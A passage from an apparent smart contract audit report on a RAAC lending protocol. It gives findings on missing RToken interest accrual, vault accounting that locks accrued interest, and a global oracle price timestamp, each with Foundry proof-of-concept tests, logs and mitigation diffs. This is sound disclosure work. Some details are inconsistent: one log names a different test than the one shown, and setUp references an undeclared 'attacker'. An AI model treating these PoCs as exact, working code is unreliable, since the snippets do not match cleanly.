    }

    function test_pocNoInsterestOnRToken() public {
        // minting crvusd to the users and deposit it
        crvusd.mint(user1, 5e18);
        crvusd.mint(user2, 2000e18);
        crvusd.mint(user3, 2000e18);
        vm.startPrank(user2);
        crvusd.approve(address(lendingPool), type(uint256).max);
        lendingPool.deposit(1000e18);
        vm.stopPrank();
        vm.startPrank(user3);
        crvusd.approve(address(lendingPool), type(uint256).max);
        lendingPool.deposit(1000e18);
        vm.stopPrank();
        vm.startPrank(user1);
        crvusd.approve(address(lendingPool), type(uint256).max);
        lendingPool.deposit(5e18);
        vm.stopPrank();
        uint256 rTokenBalanceUser1Before = rToken.balanceOf(user1);
        // warping 366 days into the future
        vm.warp(block.timestamp + 366 days); // same for vm.roll()
        // forcing updates of the pool state
        vm.startPrank(user2);
        crvusd.approve(address(lendingPool), type(uint256).max);
        lendingPool.deposit(1000e18);
        vm.stopPrank();
        vm.startPrank(user3);
        crvusd.approve(address(lendingPool), type(uint256).max);
        lendingPool.deposit(1000e18);
        vm.stopPrank();
        // and as we see the rToken balance of user1 is the same as before, as well as crvUSD balances keep the same
        // no interest accrued
        assertEq(rToken.balanceOf(user1), rTokenBalanceUser1Before);
        vm.startPrank(user1);
        lendingPool.withdraw(rToken.balanceOf(user1));
        vm.stopPrank();
        vm.startPrank(user2);
        lendingPool.withdraw(rToken.balanceOf(user2));
        vm.stopPrank();
        assertEq(crvusd.balanceOf(user1), 5e18);
        assertEq(crvusd.balanceOf(user2), 2000e18);
    }
}
```

Running above code produces the following console log:

```Solidity
Ran 1 test for test/invariant/PoC.t.sol:PoC
[PASS] test_depositWithdraw() (gas: 669456)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 21.06ms (5.66ms CPU time)

Ran 1 test suite in 28.80ms (21.06ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

Showcasing clearly, that functionality for interest accrual is missing.



## Impact

Without rewards to supply liquidity into the Pool, users will not lock up their token, therefore the protocol lacks liquidity to effectively operate.
The Likelihood is High, Impact is High which results in a total severity of High.

## Tools Used

Manual Review & Foundry Invariant



## Recommended Mitigation

Integrate the `updateLiquidityIndex` into the protocol, so that users are able to earn interest for liquidity provision.



## Appendix

Copy the following import into your `Hardhat.Config` file in the projects root dir:
`require("@nomicfoundation/hardhat-foundry");`

Paste the following into a new file "Makefile" into the projects root directory:

```Solidity
.PHONY: install-foundry init-foundry all

  

install-foundry:

    npm install --save-dev @nomicfoundation/hardhat-foundry

  

init-foundry: install-foundry

    npx hardhat init-foundry

  

# Default target that runs everything in sequence

all: install-foundry init-foundry
```

And run `make all`

## <a id='M-11'></a>M-11. Protocol Insolvency due to inability to withdraw rewards from curve            



## Description

Within the `LendingPool` it is a core functionality to deposit and withdraw assets from the curve vault, presumably to earn interest on deposited assets. However accounting within the `LendingPool` makes it impossible to withdraw accrued interest.

## Vulnerability Details

`LendingPool::_depositIntoVault`

```javascript
function _depositIntoVault(uint256 amount) internal {
        IERC20(reserve.reserveAssetAddress).approve(address(curveVault), amount);
        curveVault.deposit(amount, address(this));
@>      totalVaultDeposits += amount;
    }
```

`LendingPool::_withdrawFromVault`

```javascript
function _withdrawFromVault(uint256 amount) internal {
        curveVault.withdraw(amount, address(this), msg.sender, 0, new address[](0));
@>      totalVaultDeposits -= amount;
    }
```

As you can see above in the function the total vault deposits are tracked as amount deposited and withdrawn, not as shares, neither is there any helper function to rectify this. This means that if the deposited value is 100 crvUSD, even if it was left within the curve vault for years, could only ever be withdrawn as 100 crvUSD, leaving accrued interest permanently locked within the curve vault.

## Impact

Since this functionality is clearly meant to cover (at least partially) paid interest on RTokens, leaving the accrued interest within the curve vault will directly affect the solvency of the protocol. While users continue to accrue interest on R Tokens, the liabilities of the protocol will grow and eventually without the ability to access it's own interest rates within the curve vault, outgrow the assets.
Likelihood is High since no preconditions have to be met.
Impact is High since this directly affects the protocol solvency.

Therefore the total severity is High.

## Tools Used

Manual Review

## Recommended Mitigation

Implement functionality to update the amount of `totalVaultDeposit` depending on received vault shares.


# Low Risk Findings

## <a id='L-01'></a>L-01. lastUpdateTimestamp in RAACHausePrices has no connection to a specific asset but is updated globally            



## Description

`RAACHausePrices::setHousePrice` is supposed to update the price of an asset and update the timestamp when said asset has been updated last. The current implementation though updates `uint256 public lastUpdateTimestamp;` globally.

## Vulnerable Code

`RAACHausePrices`:

```Solidity
uint256 public lastUpdateTimestamp;
```

`RAACHausePrices::setHousePrice`:

```Solidity
/**
     * @notice Allows the owner to set the house price for a token
     * @param _tokenId The ID of the RAAC token
     * @param _amount The price to set for the house in USD
     *
@>   * Updates timestamp for each token individually
*/
function setHousePrice(
        uint256 _tokenId,
        uint256 _amount
    ) external onlyOracle {
        tokenToHousePrice[_tokenId] = _amount;
@>      lastUpdateTimestamp = block.timestamp;
        emit PriceUpdated(_tokenId, _amount);
    }
```

Looking at the code snippets we can already see quite clearly, that the intended functionality, to update the last price update timestamp individually is lacking, but the lastUpdateTimestamp for all NFTs will be updated any time any NFT will be updated.

## PoC

Since the PoC is a foundry test I have added a Makefile at the end of this report to simplify installation for your convenience. Otherwise if console commands would be prefered:

First run: `npm install --save-dev @nomicfoundation/hardhat-foundry`

Second add: `require("@nomicfoundation/hardhat-foundry");` on top of the `Hardhat.Config` file in the projects root directory.

Third run: `npx hardhat init-foundry`

And lastly, you will encounter one of the mock contracts throwing an error during compilation, this error can be circumvented by commenting out the code in entirety (`ReserveLibraryMocks.sol`).

And the test should be good to go:

After following above steps copy & paste the following code into `./test/invariant/PoC.t.sol` and run `forge test --mt test_PocTimestampOfPriceUpdatesGlobal -vv`

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {StabilityPool} from "../../contracts/core/pools/StabilityPool/StabilityPool.sol";
import {LendingPool} from "../../contracts/core/pools/LendingPool/LendingPool.sol";
import {CrvUSDToken} from "../../contracts/mocks/core/tokens/crvUSDToken.sol";
import {RAACHousePrices} from "../../contracts/core/oracles/RAACHousePriceOracle.sol";
import {RAACNFT} from "../../contracts/core/tokens/RAACNFT.sol";
import {RToken} from "../../contracts/core/tokens/RToken.sol";
import {DebtToken} from "../../contracts/core/tokens/DebtToken.sol";
import {DEToken} from "../../contracts/core/tokens/DEToken.sol";
import {RAACToken} from "../../contracts/core/tokens/RAACToken.sol";
import {RAACMinter} from "../../contracts/core/minters/RAACMinter/RAACMinter.sol";
contract PoC is Test {
    StabilityPool public stabilityPool;
    LendingPool public lendingPool;
    CrvUSDToken public crvusd;
    RAACHousePrices public raacHousePrices;
    RAACNFT public raacNFT;
    RToken public rToken;
    DebtToken public debtToken;
    DEToken public deToken;
    RAACToken public raacToken;
    RAACMinter public raacMinter;

    address owner;
    address oracle;
    address user1;
    address user2;
    address user3;
    uint256 constant STARTING_TIME = 1641070800;
    uint256 public currentBlockTimestamp;
    uint256 constant WAD = 1e18;
    uint256 constant RAY = 1e27;

    function setUp() public {
        vm.warp(STARTING_TIME);
        currentBlockTimestamp = block.timestamp;
        owner = address(this);
        oracle = makeAddr("oracle");
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        user3 = makeAddr("user3");
        uint256 initialPrimeRate = 0.1e27;
        raacHousePrices = new RAACHousePrices(owner);
        vm.prank(owner);
        raacHousePrices.setOracle(oracle);
        crvusd = new CrvUSDToken(owner);
        raacNFT = new RAACNFT(address(crvusd), address(raacHousePrices), owner);
        rToken = new RToken("RToken", "RToken", owner, address(crvusd));
        debtToken = new DebtToken("DebtToken", "DT", owner);
        deToken = new DEToken("DEToken", "DEToken", owner, address(rToken));
        vm.prank(owner);
        crvusd.setMinter(owner);
        vm.prank(owner);
        lendingPool = new LendingPool(
                            address(crvusd),
                            address(rToken),
                            address(debtToken),
                            address(raacNFT),
                            address(raacHousePrices),
                            initialPrimeRate
                        );
        rToken.setReservePool(address(lendingPool));
        debtToken.setReservePool(address(lendingPool));
        rToken.transferOwnership(address(lendingPool));
        debtToken.transferOwnership(address(lendingPool));
        stabilityPool = new StabilityPool(address(owner));
        deToken.setStabilityPool(address(stabilityPool));
        raacToken = new RAACToken(owner, 0, 0);
        raacMinter = new RAACMinter(address(raacToken), address(stabilityPool), address(lendingPool), owner);
        stabilityPool.initialize(address(rToken), address(deToken), address(raacToken), address(raacMinter), address(crvusd), address(lendingPool));
        vm.prank(owner);
        raacToken.setMinter(address(raacMinter));
        crvusd.mint(address(attacker), type(uint128).max);
        crvusd.mint(user1, type(uint128).max);
        crvusd.mint(user2, type(uint128).max);
        crvusd.mint(user3, type(uint128).max);
    }

    function test_PocTimestampOfPriceUpdatesGlobal() public {
        // Set the timestamp of the first price update
        vm.warp(14231234);
        vm.startPrank(oracle);
        raacHousePrices.setHousePrice(1, 10e18);
        vm.stopPrank();
        vm.startPrank(user1);
        crvusd.approve(address(raacNFT), 10e18);
        raacNFT.mint(1, 10e18);
        vm.stopPrank();
        (, uint256 lastUpdateId1) = raacHousePrices.getLatestPrice(1);
        // Confirm the timestamp with log and assert
        console.log(lastUpdateId1);
        assertEq(lastUpdateId1, 14231234);
        // Now we warp in the future and update the price of another NFT (ID2)
        vm.warp(14231900);
        vm.startPrank(oracle);
        raacHousePrices.setHousePrice(2, 10e18);
        vm.stopPrank();
        // Fetch the last update timestamp of NFT ID1
        (, lastUpdateId1) = raacHousePrices.getLatestPrice(1);
        // And here we see that it was indeed updated, while we actually updated ID2
        console.log(lastUpdateId1);
        assertEq(14231900, lastUpdateId1);
    }
}
```

Running that test produces the following log:

```Solidity
Ran 1 test for test/invariant/PoC.t.sol:PoC
[PASS] test_PocTimestampOfPriceUpdatesGlobal() (gas: 279897)
Logs:
  14231234
  14231900

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 17.09ms (1.68ms CPU time)
```

Showcasing indeed, that the price update of NFT ID 2 changed the last update timestamp of ID1.

## Impact

In the current implementation it is basically impossible to check when exactly a specific tokenId has been updated, because as soon as any ID will be updated, all prices will seem to be updated as well, even it is not true.
The implications are relatively obvious, since there can not be any validation on chain if the price is stale for too long (and even off-chain would be difficult since the state simply will be read wrong by off-chain tooling), it is easily possible that many prices are stale, which results in users either missing out on potential higher credit lines or, which is worse, users would potentially be due for liquidation / can borrow more than they should harming the solvency of the protocol.
Looking at the natspec, it also seems this functionality was simply forgotten.

With a High Likelihood, since the issue occurs at any price update and a High impact, due to the fact that the protocol might be carrying unknowingly bad debt, I rate the total severity as High.

## Used Tools

Manual Review

## Recommended Mitigation

A possible mitigation would include simply connecting a specific asset ID to the timestamp like shown here:

```diff
contract RAACHousePrices is Ownable {
-   mapping(uint256 => uint256) public tokenToHousePrice;
-   uint256 public lastUpdateTimestamp;
+ struct PriceData { 
+     uint256 price; 
+     uint256 lastUpdateTimestamp; 
+ } 
+ mapping(uint256 => PriceData) public tokenToPriceData;
    address public oracle;

	/// *snip* ///
	
    function setHousePrice(
        uint256 _tokenId,
        uint256 _amount
    ) external onlyOracle {
-       tokenToHousePrice[_tokenId] = _amount;
-       lastUpdateTimestamp = block.timestamp;
+ tokenToPriceData[_tokenId] = PriceData({ 
+     price: _amount, 
+     lastUpdateTimestamp: block.timestamp 
+ });
        emit PriceUpdated(_tokenId, _amount);
    }
    
	/// *snip* ///
}
```

## Appendix

Copy the following import into your ```Hardhat.Config``` file in the projects root dir:
```require("@nomicfoundation/hardhat-foundry");```


Paste the following into a new file "Makefile" into the projects root directory:

```
.PHONY: install-foundry init-foundry all

  

install-foundry:

    npm install --save-dev @nomicfoundation/hardhat-foundry

  

init-foundry: install-foundry

    npx hardhat init-foundry

  

  

# Default target that runs everything in sequence

all: install-foundry init-foundry
```

And run ```make all```


